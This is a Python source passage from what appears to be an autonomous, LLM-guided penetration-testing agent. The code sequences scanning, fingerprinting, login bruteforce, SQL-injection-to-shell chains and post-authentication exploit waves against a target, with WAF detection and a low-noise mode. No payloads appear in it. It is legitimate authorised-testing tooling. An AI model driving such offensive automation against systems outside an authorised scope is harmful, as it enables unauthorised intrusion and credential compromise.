        if not self._login_surface_wants_bruteforce(kb, findings, False):
            return False
        if not paths:
            return False
        exhausted = set(kb.get("auth_bruteforce_exhausted_login_paths", []) or [])
        if paths <= exhausted:
            return False
        return True

    def _path_is_auth_first_low_priority(self, path: str) -> bool:
        low = (path or "").lower()
        if "admin_login_bruteforce" in low or "login_page_detector" in low:
            return False
        return any(sub in low for sub in AUTH_FIRST_DEPRIORITIZE_SUBSTRINGS)

    def _apply_auth_first_execution_overrides(
        self,
        state: AgentState,
        plan: Dict[str, Any],
        findings: List[Any],
    ) -> Dict[str, Any]:
        """
        When AUTH-FIRST is active: strip noisy follow-ups, force bruteforce to the front, renumber priorities.
        """
        self._sync_campaign_goal(state)
        out = dict(plan or {})
        out["campaign_goal"] = state.campaign_goal
        if (
            is_shell_operator_goal(self._operator_campaign_goal(state))
            or state.campaign_goal == CAMPAIGN_GOAL_EXPLOIT
            or has_sqli_shell_pressure(state.knowledge_base if isinstance(state.knowledge_base, dict) else {})
            or getattr(state, "sql_findings", None)
        ):
            out["auth_first_mode"] = False
            out["auth_pressure"] = bool(self._auth_first_mode(state))
            out = self._prepend_sqli_shell_resume(state, out)
            if is_shell_operator_goal(self._operator_campaign_goal(state)):
                return self._enrich_execution_plan_actions(state, out, findings)
            # Exploit / SQLi pressure: keep SQLi first, then continue auth-first logic only
            # when no SQLi chain action was prepended.
            if any(
                isinstance(a, dict) and (
                    "sqli_shell" in str(a.get("path", "")).lower()
                    or "sqli_engine" in str(a.get("path", "")).lower()
                    or "sql_injection" in str(a.get("path", "")).lower()
                )
                for a in (out.get("next_actions") or [])
            ):
                return self._enrich_execution_plan_actions(state, out, findings)
        if self._module_block_reason_for_profile(state, "auxiliary/scanner/http/login/admin_login_bruteforce"):
            out["auth_first_mode"] = False
            out["next_actions"] = [
                a for a in (out.get("next_actions") or [])
                if not (
                    isinstance(a, dict)
                    and "admin_login_bruteforce" in str(a.get("path", "")).lower()
                )
            ]
            return self._enrich_execution_plan_actions(state, out, findings)
        if not self._auth_first_mode(state):
            out["auth_first_mode"] = False
            return self._enrich_execution_plan_actions(state, out, findings)

        out["auth_first_mode"] = True
        bf_path = "auxiliary/scanner/http/login/admin_login_bruteforce"
        raw_actions = [a for a in (out.get("next_actions") or []) if isinstance(a, dict)]

        filtered: List[Dict[str, Any]] = []
        for a in raw_actions:
            if a.get("type") == "run_followup" and self._path_is_auth_first_low_priority(str(a.get("path", ""))):
                continue
            filtered.append(a)

        seen_run: set = set()
        deduped: List[Dict[str, Any]] = []
        for a in filtered:
            if a.get("type") == "run_followup":
                key = ("run_followup", str(a.get("path", "")))
                if key in seen_run:
                    continue
                seen_run.add(key)
            deduped.append(a)

        kb = state.knowledge_base
        auth_session = self._has_authenticated_session(kb)
        wants_bf = self._login_surface_wants_bruteforce(kb, findings, auth_session)
        has_bf = any(
            a.get("type") == "run_followup" and a.get("path") == bf_path
            for a in deduped
        )
        if wants_bf and not has_bf:
            deduped.insert(0, {"type": "run_followup", "path": bf_path, "priority": 0, "options": {}})
        elif wants_bf:
            bf_rows = [a for a in deduped if a.get("type") == "run_followup" and a.get("path") == bf_path]
            rest = [a for a in deduped if a not in bf_rows]
            deduped = bf_rows + rest

        for i, a in enumerate(deduped, start=1):
            a["priority"] = i

        out["next_actions"] = deduped
        try:
            mr = int(out.get("max_requests_next_phase") or 8)
        except Exception:
            mr = 8
        out["max_requests_next_phase"] = max(mr, 8)
        return self._enrich_execution_plan_actions(state, out, findings)

    def _suggest_post_auth_methodical_actions(self, state: AgentState, knowledge_base, max_actions=8):
        kb = knowledge_base if isinstance(knowledge_base, dict) else {}
        if not self._has_authenticated_session(kb):
            return []
        catalog_hits = list(dict.fromkeys(
            self._preferred_post_auth_exploit_paths(kb)
            + list(kb.get("post_auth_exploit_paths", []) or [])
            + list(kb.get("post_auth_catalog_paths", []) or [])
        ))
        allowed = set(kb.get("module_capability_catalog", {}).get("all_paths", []) or [])
        catalog_hits = [
            path for path in sorted(
                [str(p).strip() for p in catalog_hits if str(p).strip()],
                key=lambda row: self._post_auth_candidate_sort_key(row, kb),
            )
            if path in allowed
        ]
        catalog_hits = [
            path for path in catalog_hits
            if path.startswith(("scanner/", "auxiliary/scanner/", "exploit/", "exploits/"))
        ]
        preferred_paths = set(self._preferred_post_auth_exploit_paths(kb))
        actions = []
        priority = 50
        for raw_path in catalog_hits:
            path = str(raw_path).strip()
            if not path or path not in allowed:
                continue
            low = path.lower()
            if preferred_paths and low.startswith(("exploit/", "exploits/")) and path not in preferred_paths:
                continue
            if self._post_auth_vector_is_disallowed(low):
                continue
            action_type = "run_exploit" if low.startswith("exploits/") or low.startswith("exploit/") else "run_followup"
            actions.append({"type": action_type, "path": path, "priority": priority, "options": {}})
            priority += 1
            if len(actions) >= max_actions:
                return actions

        if len(actions) < 2 and not self._discreet_mode(state):
            if "auxiliary/scanner/http/crawler" in allowed:
                actions.append({
                    "type": "run_followup",
                    "path": "auxiliary/scanner/http/crawler",
                    "priority": priority,
                    "options": {},
                })
                priority += 1

        for inj in (
            "auxiliary/scanner/http/xss_scanner",
            HTTP_SQLI_SCANNER_MODULE,
            "auxiliary/scanner/http/lfi_fuzzer",
        ):
            if self._discreet_mode(state) and not kb.get("discovered_params"):
                break
            if inj in allowed and len(actions) < max_actions:
                low = inj.lower()
                if self._post_auth_vector_is_disallowed(low):
                    continue
                actions.append({"type": "run_followup", "path": inj, "priority": priority, "options": {}})
                priority += 1
        return actions[:max_actions]

    def _run_post_auth_methodical_wave(self, state, modules, scanner, all_results, executed_paths, phase_threads, budget):
        kb = state.knowledge_base
        if not self._should_run_post_auth_methodical_wave(kb):
            return
        signals = [str(s).lower() for s in kb.get("risk_signals", [])]

        by_path = {m.get("path"): m for m in modules if m.get("path")}
        selected = []
        for path in kb.get("post_auth_catalog_paths", []) or []:
            if not path or path in executed_paths:
                continue
            mod = by_path.get(path)
            if not mod:
                continue
            low = str(path).lower()
            if not (low.startswith("scanner/") or low.startswith("auxiliary/scanner/")):
                continue
            if self._post_auth_vector_is_disallowed(low):
                continue
            selected.append(mod)
            if len(selected) >= max(3, budget // 2):
                break

        preferred_post_auth = self._preferred_post_auth_exploit_paths(kb)
        for path in preferred_post_auth:
            if path in executed_paths:
                continue
            mod = by_path.get(path)
            if not mod:
                continue
            if mod not in selected:
                selected.insert(0, mod)

        if not selected and not self._discreet_mode(state) and "auxiliary/scanner/http/crawler" not in executed_paths:
            crawler = by_path.get("auxiliary/scanner/http/crawler")
            if crawler:
                selected.append(crawler)

        inject_pool = []
        cms_lock = self._get_cms_lock_specializations(kb)
        allow_inject = ("authenticated_session" in signals) or not cms_lock
        for p in (
            "auxiliary/scanner/http/xss_scanner",
            HTTP_SQLI_SCANNER_MODULE,
            "auxiliary/scanner/http/lfi_fuzzer",
        ):
            if p in executed_paths or not allow_inject:
                continue
            m = by_path.get(p)
            if m and not self._post_auth_vector_is_disallowed(p.lower()):
                inject_pool.append(m)

        remaining_budget = max(0, budget - len(selected))
        for m in inject_pool:
            if remaining_budget <= 0:
                break
            if len(kb.get("discovered_params", [])) < 1 and len(kb.get("discovered_endpoints", [])) < 2:
                break
            selected.append(m)
            remaining_budget -= 1

        if not selected:
            kb["post_auth_methodical_wave_done"] = True
            state.knowledge_base = kb
            return

        if state.verbose:
            print_status(f"Post-auth methodical wave: {len(selected)} module(s)")

        wave_results = self._execute_plan_modules_with_options(
            selected,
            state,
            option_overrides=self._build_inferred_option_overrides(selected, state),
            verbose=bool(state.verbose),
        )
        all_results.extend(wave_results)
        for m in selected:
            p = m.get("path")
            if p:
                executed_paths.add(p)
        wave_hints = self._extract_tech_hints(wave_results)
        self._update_knowledge_base_from_results(
            kb,
            wave_results,
            [m.get("path") for m in selected if m.get("path")],
            wave_hints,
            set(),
        )
        kb["post_auth_methodical_wave_done"] = True
        state.knowledge_base = kb

    def _run_ultra_fingerprint_pass(self, state: AgentState) -> None:
        if state.target_reachable is False:
            return
        target_info = state.target_info or {}
        kb = state.knowledge_base
        if not target_info or not isinstance(kb, dict):
            return

        scheme = str(target_info.get("scheme", "http")).lower()
        host = str(target_info.get("hostname", "")).strip()
        port = int(target_info.get("port", 80))
        if not host:
            return
        base_url = f"{scheme}://{host}:{port}"

        probe_limit = 10 if not self._discreet_mode(state) else 5
        probe_paths, probe_tier = self._resolve_active_probe_paths_for_state(
            state,
            limit=probe_limit,
        )
        if self._discreet_mode(state):
            allowed = {"/", "/robots.txt", "/sitemap.xml", "/login", "/health"}
            probe_paths = [p for p in probe_paths if p in allowed][:5]
        if probe_tier == "shell" and "/?rest_route=/" not in probe_paths:
            probe_paths = list(probe_paths) + ["/?rest_route=/"]
            probe_paths = probe_paths[:probe_limit]
        probe_results = []
        tech_hints = set([str(x).lower() for x in kb.get("tech_hints", [])])
        endpoints = set(kb.get("discovered_endpoints", []))
        params = set(kb.get("discovered_params", []))
        login_paths = set(kb.get("login_paths", []))
        risk_signals = set(kb.get("risk_signals", []))
        fingerprint_blobs = []

        urls = [f"{base_url}{path}" for path in probe_paths[:10]]
        probe_rows = self._http_probe_many(state, urls, timeout_s=4, read_bytes=8192)
        for path, row in zip(probe_paths[:10], probe_rows):
            if row.get("error"):
                continue
            status = int(row.get("status") or 0)
            headers = row.get("headers", {}) if isinstance(row.get("headers"), dict) else {}
            body = str(row.get("body", "") or "")
            try:
                final_url_path = urllib.parse.urlparse(str(row.get("final_url", "") or "")).path or ""
            except Exception:
                final_url_path = ""

            if self._result_waf_signal({"status_code": status, "body": body, "details": headers}):
                risk_signals.add("waf_or_blocking_detected")

            blob = f"{path} {headers} {body}".lower()
            fingerprint_blobs.append(blob)
            probe_results.append({
                "path": path,
                "status": status,
                "location": str(headers.get("location", ""))[:200],
                "final_path": final_url_path[:200],
            })
            for endpoint in self._extract_endpoint_candidates(blob):
                endpoints.add(endpoint)
            for param in self._extract_param_candidates(blob):
                params.add(param)

            if any(m in blob for m in WORDPRESS_BODY_FINGERPRINT_TOKENS):
                tech_hints.add("wordpress")
                self._update_tech_confidence(kb, "wordpress", 0.22)
            if self._wordpress_probe_signal(
                path,
                status,
                body,
                final_url_path,
                headers.get("location", ""),
            ):
                tech_hints.add("wordpress")
                self._update_tech_confidence(kb, "wordpress", 0.18)
            if any(m in blob for m in DRUPAL_BLOB_MARKERS):
                tech_hints.add("drupal")
                self._update_tech_confidence(kb, "drupal", 0.25)
            if any(m in blob for m in JOOMLA_BLOB_MARKERS):
                tech_hints.add("joomla")
                self._update_tech_confidence(kb, "joomla", 0.25)
            if any(m in blob for m in DVWA_BLOB_MARKERS) or "dvwa" in blob:
                tech_hints.add("dvwa")
                self._update_tech_confidence(kb, "dvwa", 0.22)
                if "/dvwa" in blob:
                    login_paths.add("/dvwa/login.php")
                    endpoints.add("/dvwa/")
                    endpoints.add("/dvwa/login.php")
            if "generator" in blob and "wordpress" in blob:
                self._update_tech_confidence(kb, "wordpress", 0.2)

            # Generic auth-surface inference from redirect/login markers.
            location = str(headers.get("location", "")).lower()
            if status in HTTP_REDIRECT_STATUSES and any(token in location for token in AUTH_PATH_MARKERS):
                risk_signals.add("login_redirect_detected")
                normalized_location = location.split("?", 1)[0] if location.startswith("/") else "/login"
                endpoints.add(normalized_location)
                login_paths.add(normalized_location)
                tech_hints.add("auth_portal")
            final_path_low = str(final_url_path or "").lower()
            normalized_test_path = str(path).split("?", 1)[0].lower()
            # urlopen follows redirects by default: detect login redirects from final URL too.
            if final_path_low and final_path_low != normalized_test_path and any(
                token in final_path_low for token in AUTH_PATH_MARKERS
            ):
                risk_signals.add("login_redirect_detected")
                risk_signals.add("login_surface_detected")
                endpoints.add(final_path_low)
                login_paths.add(final_path_low)
                tech_hints.add("auth_portal")
            if ("type=\"password\"" in blob or "type='password'" in blob) and any(
                token in blob for token in ("username", "name=\"user", "name='user", "email")
            ):
                risk_signals.add("login_form_detected")
                tech_hints.add("auth_portal")
                if any(token in path for token in AUTH_PATH_MARKERS):
                    login_paths.add(path)
            if any(token in path for token in AUTH_PATH_MARKERS) and status in (200, 301, 302, 401, 403):
                risk_signals.add("login_surface_detected")
                login_paths.add(path)

            if status in HTTP_STATUS_RISK_SIGNALS:
                risk_signals.add(f"http_status_{status}")

        if probe_results:
            kb["fingerprint_trace"] = probe_results
            self._record_waf_signals_from_results(
                state,
                [
                    {
                        "status_code": row.get("status"),
                        "body": row.get("body", ""),
                        "details": row.get("headers", {}),
                    }
                    for row in probe_rows
                    if isinstance(row, dict)
                ],
                "ultra-fingerprint",
            )
        dynamic_keywords = self._extract_adaptive_keywords(" ".join(fingerprint_blobs))
        for keyword in self._match_keywords_to_catalog(kb, dynamic_keywords):
            tech_hints.add(keyword)
        kb["tech_hints"] = sorted(tech_hints)
        kb["discovered_endpoints"] = sorted(endpoints)[:300]
        kb["discovered_params"] = sorted(params)[:200]
        kb["login_paths"] = sorted(login_paths)[:40]
        kb["risk_signals"] = sorted(risk_signals)
        self._promote_corroborated_web_apps(kb)
        state.knowledge_base = kb

    def _run_agent_flow(self, state: AgentState) -> AgentState:
        install_requests_budget_hook()
        store = getattr(state, "run_store", None)
        if store is not None:
            self._paths = store.paths
            self._report.set_paths(store.paths)
            self._module_perf.set_paths(store.paths)
            self._module_health.set_paths(store.paths)
            self._module_ctx.set_paths(store.paths)
            self._learning.set_paths(store.paths)
        with network_budget_context(getattr(state, "network_budget", None)), runtime_policy_context(
            getattr(state, "runtime_policy", None),
            getattr(state, "scope_guard", None),
        ):
            if HAS_LANGGRAPH and state.current_phase in {"", "init", "scan"}:
                return self._run_with_langgraph(state)
            if not HAS_LANGGRAPH:
                print_warning("LangGraph not installed, using built-in linear workflow.")
            return self._run_linear_fallback(state)

    def _run_with_langgraph(self, state: AgentState) -> AgentState:
        graph = StateGraph(dict)

        def _wrap(fn):
            def _inner(raw: Dict[str, Any]) -> Dict[str, Any]:
                st = agent_state_from_dict(raw)
                phase = fn.__name__.replace("_node_", "")
                st.phase_started_at = time.monotonic()
                st.current_phase = phase
                self._emit_phase_operator_event(st, phase)
                if st.error and phase != "report":
                    return agent_state_to_dict(st)
                if phase != "report" and self._phase_stop_reason(st, phase):
                    return agent_state_to_dict(st)
                out = fn(st)
                self._checkpoint_state(out, phase)
                return agent_state_to_dict(out)

            return _inner

        graph.add_node("scan", _wrap(self._node_scan))
        graph.add_node("analyze", _wrap(self._node_analyze))
        graph.add_node("reason", _wrap(self._node_reason))
        graph.add_node("exploit", _wrap(self._node_exploit))
        graph.add_node("report", _wrap(self._node_report))
        graph.set_entry_point("scan")
        graph.add_edge("scan", "analyze")
        graph.add_edge("analyze", "reason")
        graph.add_edge("reason", "exploit")
        graph.add_conditional_edges(
            "exploit",
            self._route_after_exploit,
            {"reason": "reason", "report": "report"},
        )
        graph.add_edge("report", END)

        app = graph.compile()
        try:
            return agent_state_from_dict(
                app.invoke(agent_state_to_dict(state), {"recursion_limit": 12})
            )
        except Exception as exc:
            if "recursion limit" not in str(exc).lower():
                raise
            print_warning(
                "LangGraph recursion guard tripped; falling back to the built-in linear workflow."
            )
            state.current_phase = "scan"
            return self._run_linear_fallback(state)

    def _run_linear_fallback(self, state: AgentState) -> AgentState:
        phases = (
            ("scan", self._node_scan),
            ("analyze", self._node_analyze),
            ("reason", self._node_reason),
            ("exploit", self._node_exploit),
            ("report", self._node_report),
        )
        names = [name for name, _fn in phases]
        start = state.current_phase if state.current_phase in names else "scan"
        start_index = names.index(start)
        for phase, fn in phases[start_index:]:
            state.phase_started_at = time.monotonic()
            state.current_phase = phase
            self._emit_phase_operator_event(state, phase)
            if phase != "report" and self._phase_stop_reason(state, phase):
                continue
            try:
                state = fn(state)
            except KeyboardInterrupt:
                raise
            except Exception as exc:
                self._record_agent_error(state, phase, exc, fatal=True, phase=phase)
                state.error = f"{phase}: {exc}"
            self._checkpoint_state(state, phase)
            if phase == "exploit" and state.replan_pending and state.replan_count < 1:
                if state.verbose:
                    print_info("Low-confidence exploit phase — replanning with remaining LLM budget.")
                state = self._node_reason(state)
                self._checkpoint_state(state, "reason")
                state = self._node_exploit(state)
                self._checkpoint_state(state, "exploit")
            if state.error and phase != "report":
                break
        if state.current_phase != "report":
            state = self._node_report(state)
            self._checkpoint_state(state, "report")
        return state

    def _should_replan_after_exploit(self, state: AgentState) -> bool:
        if state.dry_run or state.plan_only or state.no_exploit:
            return False
        if not state.llm_local:
            return False
        if state.replan_count >= 1:
            return False
        if llm_budget_remaining(state) <= 0:
            return False
        if state.new_sessions:
            return False
        confidence = float((state.execution_plan or {}).get("reasoning_confidence", 1.0) or 1.0)
        if confidence < 0.55:
            return True
        if state.decision_source == "heuristic" and int(getattr(state.metrics, "llm_fallback_count", 0) or 0) > 0:
            return True
        if state.vulnerable_results and not state.new_sessions and confidence < 0.7:
            actions = (state.execution_plan or {}).get("next_actions") or []
            if actions:
                return True
        return False

    def _route_after_exploit(self, raw: Dict[str, Any]) -> str:
        state = agent_state_from_dict(raw)
        if state.replan_pending and state.replan_count < 1:
            raw["replan_pending"] = False
            raw["replan_count"] = 1
            return "reason"
        return "report"

    def _node_scan(self, state: AgentState) -> AgentState:
        state.metrics.deterministic_steps += 1
        if state.dry_run:
            print_status("Building agent dry-run plan...")
            all_modules = self._catalog.discover_campaign_modules(
                expanded=bool(getattr(state, "expanded_surface", False)),
            )
            modules = self._select_modules_for_target(state, all_modules)
            selected = list(modules[: max(1, int(state.max_modules or 1))])
            state.results = [
                {
                    "module": row.get("name", row.get("path")),
                    "path": row.get("path"),
                    "status": "planned",
                    "vulnerable": False,
                    "message": "dry-run: no module executed",
                    "details": {
                        "risk": assess_module_risk(
                            row,
                            str(row.get("path", "")),
                        ).level,
                    },
                }
                for row in selected
            ]
            state.execution_plan = {
                "next_actions": [
                    {
                        "type": "prioritize",
                        "path": row.get("path"),
                        "priority": index,
                    }
                    for index, row in enumerate(selected, start=1)
                ],
                "max_requests_next_phase": 0,
                "stop_conditions": ["dry_run_complete"],
                "reasoning_confidence": 1.0,
                "skip_exploitation": True,
            }
            state.llm_plan = {
                "selected_paths": [row.get("path") for row in selected if row.get("path")],
                "rationale": "Dry-run plan generated without network traffic.",
                "next_best_action": None,
            }
            state.campaign_stop_reason = "dry_run_complete"
            self._append_timeline_event(
                state,
                "scan",
                f"Dry-run selected {len(selected)} module(s); no traffic sent.",
                kind="plan",
                modules=selected,
            )
            return state
        print_status("Scanning target...")
        request_intel_results = self._ingest_http_request_intelligence(state)
        reachable, reason = self._probe_target_reachability(state)
        state.target_reachable = reachable
        state.reachability_reason = reason
        self._append_timeline_event(
            state,
            "scan",
            f"Reachability probe: {'reachable' if reachable else 'unreachable'} - {reason}",
            kind="probe",
        )
        if not reachable:
            hostname = str((state.target_info or {}).get("hostname", "") or "").strip()
            passive_osint_ok = (
                getattr(state, "expanded_surface", False)
                and self._hostname_is_osint_domain(hostname)
            )
            if getattr(state, "expanded_surface", False) and not passive_osint_ok:
                state.results = list(request_intel_results)
                state.vulnerable_results = []
                state.contextual_findings = []
                state.sql_findings = []
                state.potential_findings = []
                state.execution_plan = {
                    "next_actions": [],
                    "max_requests_next_phase": 0,
                    "stop_conditions": ["target_unreachable"],
                    "reasoning_confidence": 1.0,
                    "skip_exploitation": True,
                }
                state.llm_plan = {
                    "selected_paths": [],
                    "rationale": f"Target unreachable (IP or invalid domain): {reason}",
                    "next_best_action": None,
                }
                state.campaign_stop_reason = "target_unreachable"
                print_warning(
                    f"Primary target unreachable ({reason}); stopping campaign "
                    "(OSINT requires a domain, not an IP)."
                )
                return state
            if passive_osint_ok:
                print_warning(
                    f"Primary target unreachable ({reason}); skipping active HTTP scan "
                    "(passive OSINT may continue)."
                )
                state.campaign_stop_reason = "target_unreachable_passive_only"
            elif self._has_proxy_request_intel(state):
                state.results = list(request_intel_results)
                state.vulnerable_results = []
                state.contextual_findings = []
                state.sql_findings = []
                state.potential_findings = []
                state.execution_plan = {
                    "next_actions": [],
                    "max_requests_next_phase": 0,
                    "stop_conditions": ["target_unreachable"],
                    "reasoning_confidence": 1.0,
                    "skip_exploitation": True,
                }
                state.llm_plan = {
                    "selected_paths": [],
                    "rationale": (
                        f"Target unreachable by direct probe ({reason}), but matching "
                        "KittyProxy requests were analyzed."
                    ),
                    "next_best_action": None,
                }
                state.campaign_stop_reason = "target_unreachable_with_proxy_request_intel"
                print_warning(
                    f"Target unreachable by direct probe, using captured HTTP request intelligence: {reason}"
                )
                return state
            else:
                state.results = []
                state.vulnerable_results = []
                state.contextual_findings = []
                state.sql_findings = []
                state.potential_findings = []
                state.execution_plan = {
                    "next_actions": [],
                    "max_requests_next_phase": 0,
                    "stop_conditions": ["target_unreachable"],
                    "reasoning_confidence": 1.0,
                    "skip_exploitation": True,
                }
                state.llm_plan = {
                    "selected_paths": [],
                    "rationale": f"Target unreachable: {reason}",
                    "next_best_action": None,
                }
                state.campaign_stop_reason = "target_unreachable"
                print_warning(f"Target unreachable, stopping early: {reason}")
                return state
        if state.campaign_stop_reason:
            print_warning(f"Campaign paused: {state.campaign_stop_reason}")
            state.results = list(request_intel_results)
            state.vulnerable_results = []
            state.contextual_findings = []
            state.sql_findings = []
            state.potential_findings = []
            state.execution_plan = {
                "next_actions": [],
                "max_requests_next_phase": 0,
                "stop_conditions": ["waf_or_blocking_detected"],
                "reasoning_confidence": 1.0,
                "skip_exploitation": True,
            }
            return state
        self._append_timeline_event(
            state,
            "scan",
            "Starting ultra-fingerprint and multi-phase scan campaign.",
            extra={"max_modules": state.max_modules, "threads": state.threads},
        )
        if getattr(state, "expanded_surface", False):
            print_info(
                "Expanded surface (--all): including OSINT / cloud / passive aux modules with web scanners."
            )
        self._run_ultra_fingerprint_pass(state)
        if state.campaign_stop_reason:
            print_warning(f"Campaign paused: {state.campaign_stop_reason}")
            state.execution_plan = {
                "next_actions": [],
                "max_requests_next_phase": 0,
                "stop_conditions": ["waf_or_blocking_detected"],
                "reasoning_confidence": 1.0,
                "skip_exploitation": True,
            }
            return state
        scanner = state.scanner
        all_modules = self._catalog.discover_campaign_modules(
            expanded=bool(getattr(state, "expanded_surface", False)),
        )
        modules = self._select_modules_for_target(state, all_modules)
        if not modules:
            state.error = "No scanner modules available for this target/filter."
            return state

        results = list(request_intel_results)
        if getattr(state, "expanded_surface", False):
            intel_results = self._run_expanded_surface_intel_phase(state, all_modules)
            results.extend(intel_results)

        scan_results = self._run_scan_campaign(state, modules, scanner)
        results.extend(scan_results)

        if is_shell_operator_goal(self._operator_campaign_goal(state)):
            kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
            extra_paths = [
                str(p).split("?", 1)[0]
                for p in (kb.get("discovered_endpoints", []) or [])
                if isinstance(p, str) and p.startswith("/")
            ][:16]
            if extra_paths:
                _, probe_rows = self._run_active_web_surface_probe(
                    state,
                    extra_paths=extra_paths,
                    max_requests=min(10, len(extra_paths)),
                )
                results.extend(probe_rows)

        if not results:
            state.error = "No relevant modules selected after intelligent scan campaign."
            return state

        if getattr(state, "expanded_surface", False):
            results = self._run_derived_host_surface_scans(state, scanner, all_modules, results)
        elif is_shell_operator_goal(self._operator_campaign_goal(state)):
            kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
            if kb.get("subdomain_candidates") or kb_subdomain_surface_expandable(kb):
                results = self._run_derived_host_surface_scans(state, scanner, all_modules, results)

        state.results = results
        state.vulnerable_results = deduplicate_scanner_results(
            [r for r in results if self._is_actionable_finding(r)],
            target_info=state.target_info,
        )
        self._ingest_sessions_from_scan_results(state, results)
        self._sync_campaign_goal(state)
        self._append_timeline_event(
            state,
            "scan",
            f"Scan completed with {len(results)} result(s) and {len(state.vulnerable_results)} actionable finding(s).",
            results=results,
        )
        return state

    def _run_scan_campaign(self, state: AgentState, modules, scanner):
        """
        Multi-phase scan campaign with opportunistic ordering within each batch:

        - After each mini-batch, the KB is updated; the next batch is chosen by **utility**
          (expected information gain / estimated network cost), not only static phase lists.
        - Phases remain (cms-probe → recon/crawl → injection → adaptive → follow-up → targeted)
          for safety and budget accounting; **module order inside a phase** is utility-ranked.
        - ``information_score_kb`` (telemetry) summarizes discovery growth; see
          :mod:`interfaces.command_system.builtin.agent.campaign_utility`.

        Phases:
        0) cms-probe (wordpress/drupal/joomla detectors first)
        1) recon/fingerprint
        2) crawl/discovery (skipped when CMS lock is active — no generic crawler needed)
        3) injection-focused checks
        4) adaptive specialized modules
        5) follow-up chains
        6) targeted ranking (hint-weighted baseline, unchanged list composition)
        """
        if state.target_reachable is False:
            if bool(state.verbose):
                print_info("Scan campaign skipped: target unreachable.")
            return []
        verbose = bool(state.verbose)
        max_modules = int(state.max_modules)
        threads = int(state.threads)
        self._sync_campaign_goal(state)
        if isinstance(state.knowledge_base, dict):
            state.knowledge_base["planner_campaign_goal"] = state.campaign_goal or ""
        # Avoid mixed/interleaved module output in verbose mode: run campaign
        # phases sequentially so logs remain attributable to the right module.
        phase_threads = 1 if verbose or self._discreet_mode(state) else max(2, min(threads, 8))
        forced_protocol = state.protocol

        # For non-web explicit protocol scans, keep bounded one-pass behavior.
        if forced_protocol and forced_protocol not in ("http", "https"):
            selected = modules[:max_modules]
            if is_shell_operator_goal(state.campaign_goal) or bool(getattr(state, "shell_hunter", False)):
                seen = {module_path_lower(m) for m in selected}
                for module in modules:
                    path = module_path_lower(module)
                    if f"auxiliary/scanner/{forced_protocol}/" in path and path not in seen:
                        selected.append(module)
                        seen.add(path)
                selected = selected[:max_modules]
            if verbose:
                print_info(f"Scan campaign: bounded single-pass ({len(selected)} modules).")
            single_pass_results = self._execute_agent_modules(
                state,
                scanner,
                selected,
                state.target_info,
                threads,
                verbose,
                "single-pass",
            )
            self._update_knowledge_base_from_results(
                state.knowledge_base,
                single_pass_results,
                [m.get("path") for m in selected if m.get("path")],
                set(),
                set(),
            )
            self._ingest_sessions_from_scan_results(state, single_pass_results)
            return self._finalize_scan_campaign(
                state,
                modules,
                scanner,
                single_pass_results,
                {m.get("path") for m in selected if m.get("path")},
                max(2, min(threads, 8)),
                {str(x).lower() for x in (state.knowledge_base or {}).get("tech_hints", [])},
            )

        executed_paths = set()
        all_results = []
        kb = state.knowledge_base
        tech_hints = {str(x).lower() for x in kb.get("tech_hints", [])}
        no_novelty_streak = 0
        probable_cms_lock = self._get_probable_cms_specializations(kb)

        # Fast CMS fingerprint pass: run lightweight CMS detectors before recon/crawl so
        # we can skip generic crawling when the stack is already known (WordPress/Drupal/Joomla).
        kb_pre_cms_probe = kb_light_copy(state.knowledge_base)
        cms_probe_modules = self._select_modules_opportunistic(
            self._pick_cms_detector_modules(modules),
            state,
            tech_hints,
            executed_paths,
            min(3, max_modules),
        )
        if cms_probe_modules:
            self._append_timeline_event(
                state,
                "cms-probe",
                f"Selected {len(cms_probe_modules)} CMS detector module(s).",
                modules=cms_probe_modules,
            )
            self._log_opportunistic_pick("cms-probe", cms_probe_modules, state, tech_hints, set(executed_paths))
            if verbose:
                print_status(f"Phase cms-probe: executing {len(cms_probe_modules)} module(s)")
            cms_probe_results = self._execute_agent_modules(
                state,
                scanner,
                cms_probe_modules,
                state.target_info,
                1 if verbose else max(2, min(threads, 6)),
                False,
                "cms-probe",
            )
            all_results.extend(cms_probe_results)
            selected_paths = [m.get("path") for m in cms_probe_modules if m.get("path")]
            for module in cms_probe_modules:
                path = module.get("path")
                if path:
                    executed_paths.add(path)
            cms_probe_hints = self._extract_tech_hints(cms_probe_results)
            tech_hints.update(cms_probe_hints)
            self._update_knowledge_base_from_results(
                state.knowledge_base,
                cms_probe_results,
                selected_paths,
                cms_probe_hints,
                set(),
            )
            self._record_module_performance_phase(state, kb_pre_cms_probe, cms_probe_results, "cms-probe")
            self._append_timeline_event(
                state,
                "cms-probe",
                "CMS probe phase completed.",
                modules=cms_probe_modules,
                results=cms_probe_results,
                extra={"tech_hints": sorted(tech_hints)[:8]},
            )
            if state.campaign_stop_reason:
                return self._finalize_scan_campaign(
                    state, modules, scanner, all_results, executed_paths, phase_threads, tech_hints,
                )
            if self._has_shell_milestone(state):
                self._ingest_sessions_from_scan_results(state, cms_probe_results)
                return self._finalize_scan_campaign(
                    state, modules, scanner, all_results, executed_paths, phase_threads, tech_hints,
                )
            if self._credential_milestone_reached(state.knowledge_base):
                return self._pivot_scan_campaign_after_credentials(
                    state,
                    modules,
                    scanner,
                    all_results,
                    executed_paths,
                    phase_threads,
                    tech_hints,
                    verbose,
                    "cms-probe",
                )

        # Budget split (adaptive): computed *after* cms-probe so tech_confidence / hints apply.
        budget_plan = self._compute_adaptive_budgets(state)
        recon_budget = min(max(4, int(state.recon_modules)), max_modules, budget_plan["recon"])
        crawl_budget = budget_plan["crawl"]
        inject_budget = budget_plan["inject"]
        specialized_budget = budget_plan["specialized"]
        followup_budget = budget_plan["followup"]

        auth_focus = self._should_prioritize_auth_surface(state.knowledge_base)
        if auth_focus:
            crawl_budget = 0
            inject_budget = min(inject_budget, 3)
            if verbose:
                print_status(
                    "Auth surface detected early: skipping generic crawler and keeping follow-up tight."
                )

        if probable_cms_lock:
            crawl_budget = 0
            if verbose:
                print_status(
                    "CMS hinted during ultra-fingerprint: skipping generic crawler until CMS-specific checks finish."
                )

        spec_after_probe = self._detect_specializations(
            tech_hints, all_results, state.knowledge_base
        )
        cms_lock_after_probe = self._get_cms_lock_specializations(
            state.knowledge_base, spec_after_probe
        )
        effective_cms_lock = cms_lock_after_probe.union(probable_cms_lock)
        if effective_cms_lock:
            crawl_budget = 0
            if verbose:
                print_status(
                    "Crawl phase skipped: CMS identified (structure known; crawler not needed)."
                )

        phase_specs = [
            ("recon", self._pick_recon_modules(modules, state), recon_budget),
            ("crawl", self._pick_crawler_modules(modules), crawl_budget),
        ]

        for phase_name, phase_modules, budget in phase_specs:
